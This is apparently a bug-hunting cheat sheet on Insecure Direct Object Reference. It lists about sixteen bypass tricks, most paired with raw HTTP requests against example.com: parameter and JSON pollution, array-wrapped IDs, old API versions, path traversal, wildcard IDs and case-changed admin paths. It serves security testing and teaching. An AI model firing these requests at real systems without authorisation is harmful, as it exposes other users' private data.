# Insecure Direct Object Reference (IDOR)

## Introduction
IDOR stands for Insecure Direct Object Reference is a security vulnerability in which a user is able to access and make changes to data of any other user present in the system.

## Where to find
- Usually it can be found in APIs.
- Check the HTTP request that contain unique ID, for example `user_id` or `id`

## How to exploit
1. Add parameters onto the endpoints for example, if there was
```
GET /api/v1/getuser HTTP/1.1
Host: example.com
...
```
Try this to bypass
```
GET /api/v1/getuser?id=1234 HTTP/1.1
Host: example.com
...
```

2. HTTP Parameter pollution
```
POST /api/get_profile HTTP/1.1
Host: example.com
...

user_id=hacker_id&user_id=victim_id
```

3. Add .json to the endpoint
```
GET /v2/GetData/1234 HTTP/1.1
Host: example.com
...
```
Try this to bypass
```
GET /v2/GetData/1234.json HTTP/1.1
Host: example.com
...
```

4. Test on outdated API Versions
```
POST /v2/GetData HTTP/1.1
Host: example.com
...

id=123
```
Try this to bypass
```
POST /v1/GetData HTTP/1.1
Host: example.com
...

id=123
```

5. Wrap the ID with an array.
```
POST /api/get_profile HTTP/1.1
Host: example.com
...

{"user_id":111}
```
Try this to bypass
```
POST /api/get_profile HTTP/1.1
Host: example.com
...

{"id":[111]}
```

6. Wrap the ID with a JSON object
```
POST /api/get_profile HTTP/1.1
Host: example.com
...

{"user_id":111}
```
Try this to bypass
```
POST /api/get_profile HTTP/1.1
Host: example.com
...

{"user_id":{"user_id":111}}
```

7. JSON Parameter Pollution
```
POST /api/get_profile HTTP/1.1
Host: example.com
...

{"user_id":"hacker_id","user_id":"victim_id"}
```

8. Try decode the ID, if the ID encoded using md5,base64,etc
```
GET /GetUser/dmljdGltQG1haWwuY29t HTTP/1.1
Host: example.com
...
```
dmljdGltQG1haWwuY29t => victim@mail.com

9. If the website using GraphQL, try to find IDOR using GraphQL
```
GET /graphql HTTP/1.1
Host: example.com
...
```
```
GET /graphql.php?query= HTTP/1.1
Host: example.com
...
```

10.  MFLAC (Missing Function Level Access Control)
```
GET /admin/profile HTTP/1.1
Host: example.com
...
```
Try this to bypass
```
GET /ADMIN/profile HTTP/1.1
Host: example.com
...
```

11. Try to swap uuid with number
```
GET /file?id=90ri2-xozifke-29ikedaw0d HTTP/1.1
Host: example.com
...
```
Try this to bypass
```
GET /file?id=302
Host: example.com
...
```

12. Change HTTP Method
```
GET /api/v1/users/profile/111 HTTP/1.1
Host: example.com
...
```
Try this to bypass
```
POST /api/v1/users/profile/111 HTTP/1.1
Host: example.com
...
```

13. Path traversal
```
GET /api/v1/users/profile/victim_id HTTP/1.1
Host: example.com
...
```
Try this to bypass
```
GET /api/v1/users/profile/my_id/../victim_id HTTP/1.1
Host: example.com
...
```

14. Change request `Content-Type`
```
GET /api/v1/users/1 HTTP/1.1
Host: example.com
Content-type: application/xml
```
Try this to bypass
```
GET /api/v1/users/2 HTTP/1.1
Host: example.com
Content-type: application/json
```

15. Send wildcard instead of ID
```
GET /api/users/111 HTTP/1.1
Host: example.com
```
Try this to bypass
```
GET /api/users/* HTTP/1.1
Host: example.com
```
```
GET /api/users/% HTTP/1.1
Host: example.com
```
```
GET /api/users/_ HTTP/1.1
Host: example.com
```
```
GET /api/users/. HTTP/1.1
Host: example.com
```
16. Try google dorking to find new endpoint

## References 
* [@swaysThinking](https://twitter.com/swaysThinking) and other medium writeup
